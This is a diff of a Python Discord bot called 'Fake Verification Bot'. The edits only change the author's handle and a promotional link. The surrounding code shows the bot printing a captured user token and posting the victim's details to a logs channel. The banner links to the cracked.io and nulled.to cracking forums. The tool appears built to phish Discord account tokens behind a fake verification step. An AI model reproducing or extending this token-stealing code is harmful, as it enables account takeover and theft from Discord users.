@@ -51,7 +51,7 @@ message = config.get('message')
 #Bot title
 def bot_title():
     os.system("cls" if os.name == "nt" else "clear")
-    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#1312")
+    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#002")
     else: pass
     print("\n\n")
     print(f"""{Fore.RESET}
@@ -63,7 +63,7 @@ def bot_title():
     \t\t\t╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n""".replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTYELLOW_EX}'))
                                                                                                          
     print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-    print(f"\t{Fore.LIGHTWHITE_EX}https://discord.verify.gay | https://github.com/FuckingToasters | https://cracked.io/Infinimonster | https://nulled.to/Infinimonster | Infinimonster#1312\n")
+    print(f"\t{Fore.LIGHTWHITE_EX}https://solo.to/Infinimonster | https://github.com/FuckingToasters | https://cracked.io/Infinimonster | https://nulled.to/Infinimonster | Infinimonster#002\n")
     print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n".replace('|', f'{Fore.LIGHTBLUE_EX}|{Fore.LIGHTWHITE_EX}'))
 
 #Bot home page
@@ -98,7 +98,7 @@ def startprint():
 intents = nextcord.Intents.default()
 intents.message_content = True
 
-bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Infinimonster#1312 & Astraa#6100", intents=intents)
+bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Infinimonster#002 & Astraa#6100", intents=intents)
 
 #Launching the Bot
 def Init():
@@ -283,7 +283,7 @@ async def start(ctx):
 
                     print(f"\t\t\t\t\t\t{y}[{b}#{y}]{w} Token: {token}")
                     if logs_channel:
-                        embed_user.set_footer(text="Made by Infinimonster#1312 »» https://github.com/FuckingToasters")
+                        embed_user.set_footer(text="Made by Infinimonster#002 »» https://github.com/FuckingToasters")
                         embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                         await logs_channel.send(embed=embed_user)
                     
